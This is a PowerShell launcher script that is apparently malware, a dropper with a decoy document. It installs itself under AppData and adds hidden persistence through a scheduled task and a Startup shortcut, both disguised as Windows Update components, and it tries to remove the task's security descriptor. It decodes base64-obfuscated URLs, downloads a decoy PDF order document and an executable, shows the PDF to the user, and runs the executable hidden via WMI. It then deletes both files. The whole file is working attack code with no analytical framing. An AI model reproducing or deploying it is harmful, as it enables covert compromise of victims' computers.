$ErrorActionPreference = 'SilentlyContinue'

# === DEBUG LOGGING (Silent in production) ===
$logFile = "$env:TEMP\launcher_log.txt"
function Log($msg) {
    try { "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - $msg" | Out-File -FilePath $logFile -Append -Encoding UTF8 } catch {}
}
Log "=== Launcher Started ==="
Log "Running as: $env:USERNAME"
Log "APPDATA: $env:APPDATA"

# === SELF-PRESERVATION ===
$localPath = "$env:APPDATA\Microsoft\Windows\Caches\launcher.ps1"
Log "Target local path: $localPath"

$currentPath = $MyInvocation.MyCommand.Path
Log "Current path: $currentPath"

function Save-ScriptToDisk {
    param([string]$Destination)
    $dir = Split-Path $Destination -Parent
    if (-not (Test-Path $dir)) { 
        New-Item -ItemType Directory -Path $dir -Force | Out-Null
        Log "Created directory: $dir"
    }
    if (-not $currentPath -or $currentPath -eq '') {
        try {
            $rawUrl = "https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/refs/heads/main/assets/launcher.ps1"
            (New-Object System.Net.WebClient).DownloadString($rawUrl) | Out-File -FilePath $Destination -Encoding UTF8 -Force
            Log "Downloaded launcher from GitHub to: $Destination"
        } catch {
            Log "ERROR downloading launcher: $_"
            exit
        }
    } else {
        Copy-Item -Path $currentPath -Destination $Destination -Force
        Log "Copied launcher from $currentPath to $Destination"
    }
    return $Destination
}

$scriptPath = Save-ScriptToDisk -Destination $localPath
Log "Script saved to: $scriptPath"

# === PERSISTENCE: Scheduled Task (Hidden via wscript.exe) ===
$taskName = "WindowsUpdateTask"
$taskExists = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
Log "Task exists check: $($taskExists -ne $null)"

if (-not $taskExists) {
    try {
        $trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
        $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""))
        $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "//B `"powershell.exe -EncodedCommand $encodedCommand`""
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -ExecutionTimeLimit (New-TimeSpan -Hours 1)
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
        Log "Scheduled Task '$taskName' registered"
        
        try {
            $taskPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$taskName"
            if (Test-Path $taskPath) { 
                Remove-ItemProperty -Path $taskPath -Name "SecurityDescriptor" -Force -ErrorAction Stop
                Log "Removed SecurityDescriptor from task"
            }
        } catch {
            Log "Could not remove SecurityDescriptor (non-admin): $_"
        }
    } catch {
        Log "ERROR creating Scheduled Task: $_"
    }
}

# === PERSISTENCE: Startup LNK (Hidden via wscript.exe) ===
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$lnkPath = "$startupPath\WindowsUpdateHelper.lnk"
Log "Startup LNK path: $lnkPath"

if (-not (Test-Path $lnkPath)) {
    try {
        $wshShell = New-Object -ComObject WScript.Shell
        $shortcut = $wshShell.CreateShortcut($lnkPath)
        $shortcut.TargetPath = "wscript.exe"
        $shortcut.Arguments = "//B `"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`"`""
        $shortcut.WindowStyle = 7
        $shortcut.Save()
        Log "Startup LNK created"
    } catch {
        Log "ERROR creating Startup LNK: $_"
    }
}

# === MAIN PAYLOAD ===
Start-Sleep -Seconds (Get-Random -Min 2 -Max 8)
Start-Sleep -Seconds (Get-Random -Min 20 -Max 30)

$cache = "$env:APPDATA\Microsoft\Windows\Caches"
if (-not (Test-Path $cache)) { New-Item -ItemType Directory -Path $cache -Force | Out-Null }

$flagFile = "$cache\installed.flag"
$isFirstRun = -not (Test-Path $flagFile)
Log "First run: $isFirstRun"

$pdfUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9OYWthel9Oby5fNjYxX3ZpZF8wMi4wMy4yMDI2LTQucGRm'))
$exeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9XaW5kb3dzVXBkYXRlSGVscGVyLmV4ZQ=='))
$pdfPath = "$cache\Nakaz_No._661_vid_02.03.2026-4.pdf"
$exePath = "$cache\WindowsUpdateHelper.exe"

$headers = @{'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'}

if ($isFirstRun -and -not (Test-Path $pdfPath)) {
    try {
        Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -Headers $headers -UseBasicParsing
        Log "PDF downloaded"
    } catch {
        Log "ERROR downloading PDF: $_"
    }
}

Start-Sleep -Milliseconds (Get-Random -Min 1500 -Max 4000)

if (-not (Test-Path $exePath)) {
    $retryCount = 0
    $maxRetries = 3
    do {
        try {
            Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -Headers $headers -UseBasicParsing
            Log "EXE downloaded"
            break
        } catch {
            $retryCount++
            Start-Sleep -Seconds 5
        }
    } while ($retryCount -lt $maxRetries)
}

if ($isFirstRun -and (Test-Path $pdfPath)) {
    try { Start-Process $pdfPath } catch {}
    New-Item -Path $flagFile -ItemType File -Force | Out-Null
    Log "PDF opened and flag created"
}

Start-Sleep -Seconds (Get-Random -Min 45 -Max 90)

if (Test-Path $exePath) {
    try {
        $wmiParams = @{
            ComputerName = $env:COMPUTERNAME
            CommandLine  = "`"$exePath`""
        }
        Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $wmiParams.CommandLine -ErrorAction Stop | Out-Null
        Log "EXE launched via WMI"
    } catch {
        try {
            $wsh = New-Object -ComObject WScript.Shell
            $wsh.Run("`"$exePath`"", 0, $false)
            Log "EXE launched via WScript.Shell"
        } catch {
            Start-Process $exePath -WindowStyle Hidden
            Log "EXE launched via Start-Process"
        }
    }
}

Start-Job -ScriptBlock {
    param($exe, $pdf)
    Start-Sleep -Seconds 300
    Remove-Item -Path $exe -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $pdf -Force -ErrorAction SilentlyContinue
} -ArgumentList $exePath, $pdfPath | Out-Null

Log "=== Launcher Completed ==="
